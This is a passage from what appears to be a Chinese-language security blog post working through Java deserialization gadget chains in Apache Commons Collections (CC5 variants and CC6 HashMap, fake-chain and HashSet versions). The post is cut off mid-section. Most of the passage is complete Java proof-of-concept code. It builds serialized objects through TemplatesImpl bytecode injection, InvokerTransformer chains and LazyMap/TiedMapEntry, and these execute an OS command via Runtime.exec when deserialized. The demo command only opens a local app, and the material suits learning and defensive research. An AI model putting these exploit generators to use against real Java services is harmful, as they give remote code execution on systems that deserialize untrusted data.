class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>慢点，这里既然提到了chain，我们可以模仿cc3来用InstantiateTransformer参与chain的构造，还有TrAXFilter：</p><p><strong>ver2</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain，封装进LazyMap</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazymap, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_InstantiateTransformer.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_InstantiateTransformer.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等一下，既然可以用TemplatesImpl，那么我们在cc2的TemplatesImpl版本中发现，TemplatesImpl的newTransformer会将自身的_bytecodes直接数组生成类对象，执行对象构造函数。</p><p>我们发现在TiedMapEntry的getValue中会将key参数传入，之后transform也会将key传递，所以这里我们还可以将tmpl传入TiedMapEntry的key属性，在最后也会被执行到。</p><p><strong>ver3</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造InvokerTransformer</span></span><br><span class="line">        InvokerTransformer iInvokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        <span class="comment">//InvokerTransformer iInvokerTransformer = new InvokerTransformer("getOutputProperties",new Class[]&#123;&#125;,new Object[]&#123;&#125;);也可以</span></span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,iInvokerTransformer);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazymap, tmpl);<span class="comment">//注意这里</span></span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_TemplatesImpl.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_TemplatesImpl.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.7&amp;1.8</strong></p></li></ul><h3 id="利用链寻找-5"><a href="#利用链寻找-5" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>CC5 用了 BadAttributeValueExpException 反序列化去触发 LazyMap.get()，除了 BadAttributeValueExpException 、AnnotationInvocationHandler 还有其他方法吗？ ysoserial告诉我们HashMap也可以！</p><p>我们再看看TiedMapEntry的内部方法hashCode：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516212156876.png" alt="image-20210516212156876"></p><p>这里也调用了getValue！</p><p>如何反序列化时触发 TiedMapEntry.hashCode() ? </p><p>ysoserial发现了HashMap的readObject方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213000509.png" alt="image-20210516213000509"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213024813.png" alt="image-20210516213024813"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213038915.png" alt="image-20210516213038915"></p><p>调用了k.hashCode。</p><p>所以很容易想当然地构造出来一版PoC：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516221018615.png" alt="image-20210516221018615"></p><p>但是你会发现，<strong>在put操作处就会触发payload了，根本不是在readObject里面</strong>。</p><p>跟进去看看，这里面直接就触发了利用链，所以我们希望利用链触发在readObejct的位置。</p><p>如果想在readObject位置触发，跟几步发现，需要在LazyMap的get方法中让下面这个判断成立，才能进入transform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516221822432.png" alt="image-20210516221822432"></p><p>这里面的map就是LazyMap，key就是123</p><p>我们当然希望返回值是false</p><p>继续跟进LazyMap的containsKey：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222703891.png" alt="image-20210516222703891"></p><p>希望getEntry(key)==null</p><p>继续跟进getEntry，这里面的key是123：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222727559.png" alt="image-20210516222727559"></p><p>这里可以看到，先有一个key是否为null的判断，<strong>123不为null所以执行了hash(key)</strong></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517095158842.png" alt="image-20210517095158842"></p><p>table是什么呢？</p><p>当我们第一次：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">hashMap.put(tmap, <span class="string">"test"</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517100233906.png" alt="image-20210517100233906"></p><p>虽然我们调用的是无参构造方法，但是这里会给我们安排到有参构造方法。</p><p><code>DEFAULT_INITIAL_CAPACITY = 16</code>进入有参构造方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517103659313.png" alt="image-20210517103659313"></p><p>这个table属于最外面的hashMap，他的长度为16</p><p>继续跟进到TiedMapEntry的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517102800741.png" alt="image-20210517102800741"></p><p>这里面的map是LazyMap类的对象，也就是我们传进去的lazyMap</p><p>继续跟，来到LazyMap的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517103044779.png" alt="image-20210517103044779"></p><p>这里面的map是我们传进去的innermap，也就是hashmap类型</p><p>跟进去看，</p><p>这里可以看到，先有一个key是否为null的判断，<strong>123不为null所以执行了hash(key)</strong></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517104830975.png" alt="image-20210517104830975"></p><p>所以这里e为null，返回null。成功会在put触发。</p><p>但是不要忘了put之后的状态：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517110138797.png" alt="image-20210517110138797"></p><p>lazymap.map就被放入了一个key，key的entry。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517110237951.png" alt="image-20210517110237951"></p><p>假如说这时候我们再通过HashMap的readObject方法来到LazyMap的get方法这里，当再次经过这次判断的时候，因为map里已经存放了entry&lt;“123”，“123”&gt;，那么就不再会是false，导致无法进入transform方法，利用链断掉。</p><p>所以我们需要把map的内容改掉：</p><p>两种方法都行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazyMap.remove(<span class="number">123</span>);</span><br><span class="line">lazyMap.clear(</span><br></pre></td></tr></table></figure><p>我们可以改写一下，将lazyMap中hashmap的put之后的key去掉，这样就可以先执行，然后在反序列化时候再执行一遍：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222948500.png" alt="image-20210516222948500"></p><h3 id="HashMap版PoC"><a href="#HashMap版PoC" class="headerlink" title="HashMap版PoC"></a>HashMap版PoC</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="keyword">String</span>[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> <span class="type">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="type">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"getMethod"</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class,Class[].class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">"getRuntime"</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"invoke"</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> <span class="type">ChainedTransformer</span>(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> <span class="type">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> <span class="type">TiedMapEntry</span>(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> <span class="type">HashMap</span>();</span><br><span class="line">        hashMap.put(tmap, <span class="string">"test"</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> <span class="type">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="type">FileOutputStream</span>(<span class="keyword">new</span> <span class="type">File</span>(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="keyword">new</span> <span class="type">File</span>(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fake-chain版PoC"><a href="#fake-chain版PoC" class="headerlink" title="fake chain版PoC"></a>fake chain版PoC</h3><p>既然现在来到了如何绕过put方法的提前执行，可以在构造LazyMap方法的时候穿进去一个空的chain，之后再利用反射将lazymap内部的<code>_itransformer</code>属性改回到真正的chain，这样就可以只最终的反序列化触发点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fackchain_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//fake chain</span></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先构造假的chain</span></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tmap, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用反射再改回真的chain</span></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(chain, transformers_exec);</span><br><span class="line">        <span class="comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span></span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_fakechain.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_fakechain.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HashSet版PoC"><a href="#HashSet版PoC" class="headerlink" title="HashSet版PoC"></a>HashSet版PoC</h3><p>在HashMap的hash中，k目前还是不可控的，所以还需要找哪些函数调用了hash函数，发现HashMap自己的put方法调用了：</p><p><img 